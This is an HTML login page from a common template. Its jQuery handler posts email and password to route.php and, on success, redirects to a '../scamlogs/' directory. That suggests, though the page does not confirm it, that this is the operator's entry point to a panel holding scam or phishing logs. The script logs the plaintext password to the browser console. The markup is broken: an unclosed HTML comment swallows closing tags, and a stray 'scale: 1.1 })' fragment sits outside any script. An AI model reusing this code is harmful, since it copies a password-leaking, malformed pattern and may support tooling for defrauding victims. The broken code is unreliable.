<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="login100-pic js-tilt" data-tilt>
					<img src="images/img-01.png" alt="IMG">
				</div>

				<form class="login100-form validate-form">
					<span class="login100-form-title">
					<h2>	Login</h2>
					<h3><p class="alert-danger wrong-p" ></p></h3>
					<h3><p class="alert-success success-p"></p></h3>
					</span>

					<div class="wrap-input100 validate-input" data-validate = "Valid email is required: ex@abc.xyz">
						<input class="input100" type="text" name="email" id="email" placeholder="Email">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-envelope" aria-hidden="true"></i>
						</span>
					</div>

					<div class="wrap-input100 validate-input" data-validate = "Password is required">
						<input class="input100" type="password" name="pass" id="password" placeholder="Password">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-lock" aria-hidden="true"></i>
						</span>
					</div>


					<div class="g-recaptcha" data-sitekey="6LcePAATAAAAAGPRWgx90814DTjgt5sXnNbV5WaW"></div> 
					
					<div class="container-login100-form-btn">
						<button class="login100-form-btn" id="submit_login">
							Login
						</button>
					</div>
	

					<!-- <div class="text-center p-t-12">

					</div>

		</div>
	</div>

			scale: 1.1
		})

	<script src="js/main.js"></script>

	<script>
	
	$('#submit_login').click(function (e) { 
     e.preventDefault();
     $('.wrong-p').fadeIn('slow');
   setTimeout(() => {
    $('.wrong-p').fadeOut('slow');
   }, 3000);

     var  FormData ={
         email : $('#email').val(),
         password : $('#password').val()
     }

     console.log(FormData);

     $.ajax({
         type: "post",
		 url: "route.php?func=login",
         data: FormData,
		 success: function (response) {
			console.log(response);
			if( response.indexOf("successful")  > 0 ){
				$('.success-p').fadeIn();
				$('.success-p').html(response);

				window.location = "../scamlogs/index.php";

				setTimeout(() => {
					$('.success-p').fadeOut();
			}, 3000);

			} else {
				$('.wrong-p').fadeIn('slow');
				$('.wrong-p').html(response);
				setTimeout(() => {
					$('.wrong-p').fadeOut('slow');
				}, 3000);

			}
        }
     });
 });


	</script>
